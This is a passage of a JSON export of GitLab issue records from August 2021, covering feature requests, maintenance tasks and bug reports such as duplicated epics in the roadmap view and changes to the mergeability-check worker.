\u0026 serves the same data for self managed instances \u0026 SaaS.\n\n## Requirements\n\n- [ ] Solution needs to have the same data insights that we could currently receive via Snowplow events on SaaS\n- [ ] Have a transition plan from the current Redis HLL metrics\n- [ ] Same API for our engineers to track events on Self Managed and on SaaS\n- [ ] Scalable solution for our self managed instances \u0026 for SaaS\n\n\n## Spike Outcome\n\nDuring this research issue, we should:\n\n1. Explore tools in this space. It is acceptable to research capabilities of Clickhouse, other event collectors and even creating our own tool.\n1. After research, make a recommendation on the implementation\n1. Create a technical implementation proposal. (include diagrams of data flow, services and other applicable references)\n1. Create a high-level estimate of how long this proposal would take to implement. (in weeks)\n1. Create an outline of the issues which would be required if we scheduled this work. (high-level bulleted list)","state":"closed","created_at":"2021-08-02T23:17:28.724Z","updated_at":"2022-04-14T16:26:14.789Z","closed_at":"2021-10-14T15:02:05.606Z","closed_by":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"labels":["Deliverable","auto updated","backend","devops::growth","group::product intelligence","missed:14.3","section::growth","spike","workflow::in review"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":4373269,"username":"ali-gitlab","name":"Alishan Ladhani","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4373269/avatar.png","web_url":"https://gitlab.com/ali-gitlab"},{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"}],"author":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"type":"ISSUE","assignee":{"id":4373269,"username":"ali-gitlab","name":"Alishan Ladhani","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4373269/avatar.png","web_url":"https://gitlab.com/ali-gitlab"},"user_notes_count":38,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337473","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337473","notes":"https://gitlab.com/api/v4/projects/278964/issues/337473/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337473/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337473","relative":"#337473","full":"gitlab-org/gitlab#337473"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6869,"epic":{"id":364571,"iid":6869,"title":"Event level tracking in self-managed instances","url":"/groups/gitlab-org/-/epics/6869","group_id":9970},"iteration":null,"health_status":null},{"id":91298102,"iid":337468,"project_id":278964,"title":"Display available metadata for PyPI","description":"### Context\n\nThe [Package GraphQL API](https://docs.gitlab.com/ee/api/graphql/reference/index.html#package) returns helpful details about a PyPI package hosted in the GitLab Package Registry. \n\n### Problem to solve\n\nThe problem is that not all of the data returned via GraphQL is displayed in the user interface. This makes it harder to use the UI as the single source of truth for packages.\n\n### Proposal\n\nUpdate the package registry user interface to display all of the available metadata for PyPI packages. \n\n#### Data to be displayed\n\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#package\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#packagedetailstype\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#packagefile\n\n#### Additional data\n\nIn addition to the data available now, there is additional package metadata included in the `setup.py` file that is not yet extracted on package upload. So this data is not returned in the API and thus will not be displayed in the user interface. https://gitlab.com/gitlab-org/gitlab/-/issues/330927 will extract this metadata, after which we will add it to the API response and UI.","state":"closed","created_at":"2021-08-02T20:19:18.965Z","updated_at":"2021-09-18T07:02:15.833Z","closed_at":"2021-09-14T10:08:44.653Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Package Registry","Deliverable","GitLab Free","Package:P1","PyPI Repository","Stretch","devops::package","direction","frontend","group::package registry","section::ops","type::feature","workflow::in review"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337468","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337468","notes":"https://gitlab.com/api/v4/projects/278964/issues/337468/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337468/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337468","relative":"#337468","full":"gitlab-org/gitlab#337468"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6007,"epic":{"id":270875,"iid":6007,"title":"Add package metadata file to the UI","url":"/groups/gitlab-org/-/epics/6007","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91298098,"iid":337467,"project_id":278964,"title":"Display available metadata for Composer","description":"### Context\n\nThe [Package GraphQL API](https://docs.gitlab.com/ee/api/graphql/reference/index.html#package) returns helpful details about a Composer package hosted in the GitLab Package Registry. \n\n### Problem to solve\n\nThe problem is that not all of the data returned via GraphQL is displayed in the user interface. This makes it harder to use the UI as the single source of truth for packages.\n\n### Proposal\n\nUpdate the package registry user interface to display all of the available metadata for Composer packages. \n\n#### Data to be displayed\n\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#package\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#packagedetailstype\n- https://docs.gitlab.com/ee/api/graphql/reference/index.html#packagefile","state":"closed","created_at":"2021-08-02T20:19:01.675Z","updated_at":"2021-09-18T07:02:15.880Z","closed_at":"2021-09-10T13:13:05.957Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Package Registry","Composer Repository","Deliverable","GitLab Free","Package:P1","Stretch","devops::package","direction","frontend","group::package registry","section::ops","type::feature","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":3799560,"username":"trizzi","name":"Tim Rizzi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3799560/avatar.png","web_url":"https://gitlab.com/trizzi"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicolò Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337467","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337467","notes":"https://gitlab.com/api/v4/projects/278964/issues/337467/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337467/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337467","relative":"#337467","full":"gitlab-org/gitlab#337467"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6007,"epic":{"id":270875,"iid":6007,"title":"Add package metadata file to the UI","url":"/groups/gitlab-org/-/epics/6007","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91295150,"iid":337458,"project_id":278964,"title":"Expose pipeline IID to the frontend","description":"### Proposal \n\nIn https://gitlab.com/gitlab-org/gitlab/-/issues/26621, we want to add an option to show Pipeline IID instead of Pipeline ID in the UI. In order to do this, the Pipeline IID needs to be exposed to the frontend.","state":"closed","created_at":"2021-08-02T18:53:23.915Z","updated_at":"2021-08-04T14:54:55.378Z","closed_at":"2021-08-04T14:29:29.978Z","closed_by":{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"},"labels":["Category:Continuous Integration","backend","devops::verify","feature::addition","group::pipeline execution","needs weight","section::ops","type::feature","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"}],"author":{"id":4905402,"username":"jreporter","name":"Jackie Porter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4905402/avatar.png","web_url":"https://gitlab.com/jreporter"},"type":"ISSUE","assignee":{"id":829774,"username":"jivanvl","name":"Jose Ivan Vargas","state":"active","avatar_url":"https://secure.gravatar.com/avatar/730cc1b85a20f2a3891829f7aa198972?s=80\u0026d=identicon","web_url":"https://gitlab.com/jivanvl"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337458","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337458","notes":"https://gitlab.com/api/v4/projects/278964/issues/337458/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337458/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337458","relative":"#337458","full":"gitlab-org/gitlab#337458"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91292870,"iid":337454,"project_id":278964,"title":"Remove the `track_unique_visits` feature flag","description":"## Problem to solve\n\nThe `track_unique_visits` feature flag was enabled under https://gitlab.com/gitlab-org/gitlab/-/issues/255994, but is no longer in use.\n\n## Proposal\n\nRemove the `track_unique_visits` feature flag.","state":"closed","created_at":"2021-08-02T17:59:08.181Z","updated_at":"2022-03-16T11:39:56.254Z","closed_at":"2021-08-20T15:41:28.511Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["backend","devops::manage","feature flag","group::optimize","maintenance::refactor","section::dev","type::maintenance","workflow::production"],"milestone":null,"assignees":[{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"}],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337454","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337454","notes":"https://gitlab.com/api/v4/projects/278964/issues/337454/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337454/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337454","relative":"#337454","full":"gitlab-org/gitlab#337454"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91292191,"iid":337453,"project_id":278964,"title":"Fix Security features tables cross-joining `ci_builds` to find project and to map pipeline -\u003e security scans -- application level (read) change to  use `security_scans.project_id` and `security_scans.pipeline_id`","description":"This is a continuation of https://gitlab.com/gitlab-org/gitlab/-/issues/333414 and https://gitlab.com/gitlab-org/gitlab/-/issues/336198. This will take care of any application level change so that we can use `security_scans.project_id` and `security_scans.pipeline_id` for reading. Before making progress on that we need to wait until our backfilling from this MR https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66963 is finished first.\n\nSee https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66963#note_640515467","state":"closed","created_at":"2021-08-02T17:40:15.713Z","updated_at":"2021-09-13T22:13:06.518Z","closed_at":"2021-09-13T22:13:06.482Z","closed_by":{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"},"labels":["auto updated","backend","bug::performance","ci-decomposition","devops::secure","gitlab.com","group::threat insights","pods::active","section::sec","severity::2","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"}],"author":{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"},"type":"ISSUE","assignee":{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"},"user_notes_count":2,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337453","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337453","notes":"https://gitlab.com/api/v4/projects/278964/issues/337453/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337453/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337453","relative":"#337453","full":"gitlab-org/gitlab#337453"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6373,"epic":{"id":309455,"iid":6373,"title":"Decomposition: Make Secure features compatible with Decomposed CI database","url":"/groups/gitlab-org/-/epics/6373","group_id":9970,"human_readable_end_date":"Aug 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91287841,"iid":337450,"project_id":278964,"title":"Add caching to MergeRequestMergeabilityCheckWorker","description":"In https://gitlab.com/gitlab-org/gitlab/-/issues/336979 we identified a number of issues with the MergeRequestMergeabilityCheckWorker. Here was one of the findings:\n\n\u003e The MergeRequestMergeabilityCheckWorker does not appear to cache consistent failures from the UserMergeToRef call.\n\u003e \n\u003e - These calls can be very expensive, running for 30 seconds or more before failing.\n\u003e - Each time a user visits the merge request page, rails will issue another MergeRequestMergeabilityCheckWorker job with the same outcome.\n\u003e - Would it be possible to cache the fact that merge check is not succeeding and skip it if it is executed for the source and target SHAs?\n\nWe should investigate if we can cache the responses to this. \n\nThis one may be closely related to the work we have defined in https://gitlab.com/groups/gitlab-org/-/epics/5598.","state":"closed","created_at":"2021-08-02T16:20:25.836Z","updated_at":"2021-09-18T07:00:58.778Z","closed_at":"2021-09-08T21:09:24.647Z","closed_by":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"labels":["Deliverable","Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","auto updated","backend","devops::create","group::code review","infradev","priority::3","section::dev","severity::3"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"}],"author":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":23,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337450","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337450","notes":"https://gitlab.com/api/v4/projects/278964/issues/337450/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337450/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337450","relative":"#337450","full":"gitlab-org/gitlab#337450"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6524,"epic":{"id":321042,"iid":6524,"title":"Engineering Allocation (Code Review BE): 02-AUG-2021","url":"/groups/gitlab-org/-/epics/6524","group_id":9970,"human_readable_end_date":"Oct 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91287578,"iid":337449,"project_id":278964,"title":"Allow MergeRequestMergeabilityCheckWorker to fail","description":"In https://gitlab.com/gitlab-org/gitlab/-/issues/336979 we identified a number of issues with the MergeRequestMergeabilityCheckWorker. Here was one of the findings:\n\n\u003e The `MergeRequestMergeabilityCheckWorker` will succeed (and log the error) even when the `MergeabilityCheckService` service check fails.\n\u003e\n\u003e Is there a reason this sidekiq job doesn't fail instead. Setting retries to 0 and failing would make this easier to understand in production.\n\nWe should investigate the configuration of this sidekiq job to see if we could have it fail on error","state":"closed","created_at":"2021-08-02T16:16:09.838Z","updated_at":"2021-10-27T10:38:52.999Z","closed_at":"2021-08-04T11:54:09.428Z","closed_by":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"labels":["Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","[deprecated] Accepting merge requests","auto updated","automation:infradev-missing-labels","backend","devops::create","group::code review","infradev","section::dev","severity::3"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"}],"author":{"id":4058309,"username":"mnohr","name":"Matt Nohr","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f2b70c7a75fd0a15ef789d4b1e620449?s=80\u0026d=identicon","web_url":"https://gitlab.com/mnohr"},"type":"ISSUE","assignee":{"id":1884221,"username":"patrickbajao","name":"Patrick Bajao","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1884221/avatar.png","web_url":"https://gitlab.com/patrickbajao"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337449","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337449","notes":"https://gitlab.com/api/v4/projects/278964/issues/337449/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337449/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337449","relative":"#337449","full":"gitlab-org/gitlab#337449"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6524,"epic":{"id":321042,"iid":6524,"title":"Engineering Allocation (Code Review BE): 02-AUG-2021","url":"/groups/gitlab-org/-/epics/6524","group_id":9970,"human_readable_end_date":"Oct 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91275984,"iid":337435,"project_id":278964,"title":"Some Epics are displaying twice in roadmap as child epics and top-level epics","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nA customer reported that the Epics roadmap for a group shows some epics twice: both as children of their parent epics (correct) and as top-level epics (incorrect).\n\nThe problematic sub-epics (3rd level) were children of another (2nd level) sub-epic which did not have assigned start / end dates. Assigning start/end dates to the middle-level sub-epic caused its children to be displayed correctly.\n\nTicket:([Internal Link](https://gitlab.zendesk.com/agent/tickets/227945))\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n- Create a parent epic A\n- Add 2 child epic (a,b) to the parent epic (A), but leave child b without a start and end date.\n- Add 2 child epics (i, ii) to the to the child epic (a) \n- Add the same child epics (i, ii) to child epic (b)\n- Check the roadmap\n\n\n### Alternative steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n- Create three levels of nested epics, A -\u003e B -\u003e C, where (A) is top level, (C) is bottom,\n- Ensure A and C have start and due date assigned,\n- Ensure B has no inherited dates but both set to `Fixed: None` in the UI,\n- View the Roadmap and see (B) at the top level.\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nSome child epics twice are displayed twice in the roadmap; both as children of their parent epics and as top-level epics.\n\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nThe child epics should only be displayed once and not as top-level epics\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e\n\nThe GraphQL query appears to return mid-level epics as top-level when the criteria in `steps to reproduce` are met. This shouldn't happen.\n\n### Proposal\n\n1. GraphQL query is update to support returning only top-level epics ~backend \n1. Client issues a request for only top-level epics in the first instance. ~frontend","state":"closed","created_at":"2021-08-02T13:34:35.133Z","updated_at":"2022-12-07T01:21:46.461Z","closed_at":"2022-06-30T11:35:05.529Z","closed_by":{"id":3236898,"username":"rajatgitlab","name":"Rajat Jain","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3236898/avatar.png","web_url":"https://gitlab.com/rajatgitlab"},"labels":["Category:Portfolio Management","Next Up","SUS::Impacting","Stretch","UX","backend","backend complete","customer","devops::plan","frontend","group::product planning","priority::3","roadmaps","section::dev","severity::3","type::bug","workflow::verification"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":3236898,"username":"rajatgitlab","name":"Rajat 